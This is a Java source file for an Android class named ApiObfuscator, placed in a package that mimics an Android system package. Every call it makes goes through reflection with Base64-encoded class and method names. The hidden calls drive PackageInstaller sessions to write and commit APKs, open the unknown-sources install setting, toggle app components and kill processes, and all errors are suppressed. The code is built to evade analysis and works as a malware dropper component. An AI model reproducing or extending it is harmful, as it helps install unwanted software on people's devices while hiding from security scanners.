package com.android.system.qspaas;

import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class ApiObfuscator {

    private final Context context;
    // Cache simples para evitar reflexão repetida
    private final Map<String, Class<?>> classCache = new HashMap<>();
    private final Map<String, Method> methodCache = new HashMap<>();

    public ApiObfuscator(Context context) {
        this.context = context;
    }

    private Class<?> loadClass(String base64Name) throws ClassNotFoundException {
        if (classCache.containsKey(base64Name)) return classCache.get(base64Name);
        Class<?> c = Class.forName(StrUtil.d(base64Name));
        classCache.put(base64Name, c);
        return c;
    }

    private Method getMethod(Class<?> clazz, String base64Name, Class<?>... params) throws NoSuchMethodException {
        String key = clazz.getName() + base64Name;
        if (methodCache.containsKey(key)) return methodCache.get(key);
        Method m = clazz.getDeclaredMethod(StrUtil.d(base64Name), params);
        m.setAccessible(true);
        methodCache.put(key, m);
        return m;
    }

    public void startActivityObfuscated(Intent intent) {
        try {
            Class<?> ctxClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbnRleHQ=");
            Method m = getMethod(ctxClass, "c3RhcnRBY3Rpdml0eQ==", Intent.class);
            m.invoke(context, intent);
        } catch (Exception ignored) {}
    }

    public PackageManager getPackageManagerObfuscated() {
        try {
            Class<?> ctxClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbnRleHQ=");
            Method m = getMethod(ctxClass, "Z2V0UGFja2FnZU1hbmFnZXI=");
            return (PackageManager) m.invoke(context);
        } catch (Exception ignored) {}
        return context.getPackageManager();
    }

    public boolean canRequestPackageInstallsObfuscated() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return true;
        try {
            PackageManager pm = getPackageManagerObfuscated();
            Method m = getMethod(pm.getClass(), "Y2FuUmVxdWVzdFBhY2thZ2VJbnN0YWxscw==");
            return (boolean) m.invoke(pm);
        } catch (Exception ignored) {}
        return false;
    }

    public Intent createUnknownSourcesIntentObfuscated() {
        try {
            // CORREÇÃO: String Base64 corrigida para MANAGE_UNKNOWN_APP_SOURCES
            String action = StrUtil.d("YW5kcm9pZC5zZXR0aW5ncy5NQU5BR0VfVU5LTk9XTl9BUFBfU09VUkNFUw==");
            Intent intent = new Intent(action);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            return intent;
        } catch (Exception ignored) {}
        return new Intent(Intent.ACTION_VIEW);
    }

    public Intent getLaunchIntentForPackageObfuscated(PackageManager pm, String packageName) {
        try {
            Method m = getMethod(pm.getClass(), "Z2V0TGF1bmNoSW50ZW50Rm9yUGFja2FnZQ==", String.class);
            return (Intent) m.invoke(pm, packageName);
        } catch (Exception ignored) {}
        return pm.getLaunchIntentForPackage(packageName);
    }

    public Object createComponentNameObfuscated(String packageName, String className) {
        try {
            Class<?> cnClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbXBvbmVudE5hbWU=");
            Constructor<?> c = cnClass.getDeclaredConstructor(String.class, String.class);
            c.setAccessible(true);
            return c.newInstance(packageName, className);
        } catch (Exception ignored) {}
        return new android.content.ComponentName(packageName, className);
    }

    public boolean getActivityInfoObfuscated(String packageName, String activityName) {
        try {
            PackageManager pm = getPackageManagerObfuscated();
            Class<?> cnClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbXBvbmVudE5hbWU=");
            Object cn = createComponentNameObfuscated(packageName, activityName);
            Method m = getMethod(pm.getClass(), "Z2V0QWN0aXZpdHlJbmZv", cnClass, int.class);
            m.invoke(pm, cn, 0);
            return true;
        } catch (Exception ignored) {}
        return false;
    }

    public void stopServiceObfuscated(Intent intent) {
        try {
            Class<?> ctxClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbnRleHQ=");
            Method m = getMethod(ctxClass, "c3RvcFNlcnZpY2U=", Intent.class);
            m.invoke(context, intent);
        } catch (Exception ignored) {}
    }

    public void setComponentEnabledSettingObfuscated(String packageName, String componentName, int newState) {
        try {
            PackageManager pm = getPackageManagerObfuscated();
            Class<?> cnClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbXBvbmVudE5hbWU=");
            Object cn = createComponentNameObfuscated(packageName, componentName);
            Method m = getMethod(pm.getClass(), "c2V0Q29tcG9uZW50RW5hYmxlZFNldHRpbmc=", cnClass, int.class, int.class);
            m.invoke(pm, cn, newState, PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    public void killProcessObfuscated(int pid) {
        try {
            Class<?> procClass = loadClass("YW5kcm9pZC5vcy5Qcm9jZXNz");
            Method m = getMethod(procClass, "a2lsbFByb2Nlc3M=", int.class);
            m.invoke(null, pid);
        } catch (Exception ignored) {}
    }

    public Object getSystemServiceObfuscated(String name) {
        try {
            Class<?> ctxClass = loadClass("YW5kcm9pZC5jb250ZW50LkNvbnRleHQ=");
            Method m = getMethod(ctxClass, "Z2V0U3lzdGVtU2VydmljZQ==", String.class);
            return m.invoke(context, name);
        } catch (Exception ignored) {}
        return context.getSystemService(name);
    }

    // --- Métodos de Instalação (PackageInstaller) ---

    public Object getPackageInstallerObfuscated(PackageManager pm) {
        try {
            Method m = getMethod(pm.getClass(), "Z2V0UGFja2FnZUluc3RhbGxlcg==");
            return m.invoke(pm);
        } catch (Exception ignored) {}
        return null;
    }

    public Object createSessionParamsObfuscated(int mode) {
        try {
            Class<?> spClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXIkU2Vzc2lvblBhcmFtcw==");
            Constructor<?> c = spClass.getDeclaredConstructor(int.class);
            c.setAccessible(true);
            return c.newInstance(mode);
        } catch (Exception ignored) {}
        return null;
    }

    public int createSessionObfuscated(Object packageInstaller, Object sessionParams) {
        try {
            Class<?> piClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXI=");
            Method m = getMethod(piClass, "Y3JlYXRlU2Vzc2lvbg==", sessionParams.getClass());
            return (int) m.invoke(packageInstaller, sessionParams);
        } catch (Exception ignored) {}
        return -1;
    }

    public Object openSessionObfuscated(Object packageInstaller, int sessionId) {
        try {
            Class<?> piClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXI=");
            Method m = getMethod(piClass, "b3BlblNlc3Npb24=", int.class);
            return m.invoke(packageInstaller, sessionId);
        } catch (Exception ignored) {}
        return null;
    }

    public OutputStream openWriteObfuscated(Object session, String name, long offset, long length) {
        try {
            Class<?> sClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXIkU2Vzc2lvbg==");
            Method m = getMethod(sClass, "b3BlbldyaXRl", String.class, long.class, long.class);
            return (OutputStream) m.invoke(session, name, offset, length);
        } catch (Exception ignored) {}
        return null;
    }

    public void fsyncObfuscated(Object session, OutputStream os) {
        try {
            Class<?> sClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXIkU2Vzc2lvbg==");
            Method m = getMethod(sClass, "ZnN5bmM=", OutputStream.class);
            m.invoke(session, os);
        } catch (Exception ignored) {}
    }

    public void commitObfuscated(Object session, IntentSender statusReceiver) {
        try {
            Class<?> sClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXIkU2Vzc2lvbg==");
            // CORREÇÃO: O método commit aceita IntentSender, não Intent
            Method m = getMethod(sClass, "Y29tbWl0", IntentSender.class);
            m.invoke(session, statusReceiver);
        } catch (Exception ignored) {}
    }

    public void closeObfuscated(Object session) {
        try {
            Class<?> sClass = loadClass("YW5kcm9pZC5jb250ZW50LnBtLlBhY2thZ2VJbnN0YWxsZXIkU2Vzc2lvbg==");
            Method m = getMethod(sClass, "Y2xvc2U=");
            m.invoke(session);
        } catch (Exception ignored) {}
    }

    public android.content.pm.PackageInfo getPackageArchiveInfoObfuscated(PackageManager pm, String path, int flags) {
        try {
            Method m = getMethod(pm.getClass(), "Z2V0UGFja2FnZUFyY2hpdmVJbmZv", String.class, int.class);
            return (android.content.pm.PackageInfo) m.invoke(pm, path, flags);
        } catch (Exception ignored) {}
        return null;
    }

    public Object getActivityManagerObfuscated() {
        return getSystemServiceObfuscated(StrUtil.d("YWN0aXZpdHk="));
    }
}
